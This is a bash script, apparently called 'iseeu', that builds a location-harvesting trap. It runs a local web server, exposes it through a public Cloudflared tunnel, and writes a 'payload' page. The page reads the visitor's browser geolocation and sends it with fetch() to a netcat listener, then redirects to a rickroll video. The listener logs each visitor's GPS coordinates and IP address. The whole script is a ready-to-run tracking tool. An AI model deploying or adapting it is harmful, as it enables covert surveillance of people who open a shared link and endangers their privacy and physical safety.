#!/bin/bash

clear

# Prompt for port
read -p "[?] Enter port to use for local server (default 8080): " PORT
PORT=${PORT:-8080}
LOG_PORT=9999  # separate port for logging

WEB_DIR="$HOME/webpage"
LOG_DIR="$HOME/iseeu/logs"
TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S')
LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt"

echo "[*] Killing existing processes..."
pkill -f "python3 -m http.server" 2>/dev/null
pkill -f cloudflared 2>/dev/null
pkill -f "nc -lk -p $LOG_PORT" 2>/dev/null

echo "[*] Creating/clearing directories..."
mkdir -p "$WEB_DIR"
mkdir -p "$LOG_DIR"
> "$LOG_FILE"
cd "$WEB_DIR" || exit 1

echo "[*] Starting local server on port $PORT..."
python3 -m http.server "$PORT" > /dev/null 2>&1 &
SERVER_PID=$!
echo "[+] Python server running (PID $SERVER_PID)"

echo "[*] Starting Cloudflared tunnel..."
cloudflared tunnel --url "http://localhost:$PORT" --logfile cf.log > /dev/null 2>&1 &
CF_PID=$!

# Wait for log file to be created
while [[ ! -f cf.log ]]; do sleep 1; done

# Extract public URL
echo -n "[*] Waiting for Cloudflared URL"
for i in {1..10}; do
  sleep 1
  echo -n "."
  URL=$(grep -oE "https://.*\.trycloudflare\.com" cf.log | head -n1)
  [[ -n "$URL" ]] && break
done
echo

if [[ -z "$URL" ]]; then
  echo "[✗] Failed to get Cloudflared public URL."
  kill $SERVER_PID $CF_PID
  exit 1
fi

echo "[✓] Public URL: $URL"

echo "[*] Creating payload HTML..."
cat <<EOF > index.html
<!DOCTYPE html>
<html>
<head>
    <title>I See You</title>
    <script>
        function redirectToRickRoll(position) {
            fetch('${URL/https/http}:$LOG_PORT/logme/' + position.coords.latitude + ',' + position.coords.longitude);
            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
        }
        function failLocation() {
            alert("Location access denied.");
        }
        navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
EOF

echo "[*] Logging to $LOG_FILE..."

# Mini listener on separate port
nc -lk -p "$LOG_PORT" | while read line; do
  if [[ "$line" == *"/logme/"* ]]; then
    GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3)
    IP=$(echo "$line" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    echo "[$(date)] GPS: $GPS | IP: $IP" >> "$LOG_FILE"
  fi
done &
NC_PID=$!

trap 'echo "[*] Cleaning up..."; kill $SERVER_PID $CF_PID $NC_PID; echo "[*] Done."' EXIT
echo "[*] Press Ctrl+C to stop."

wait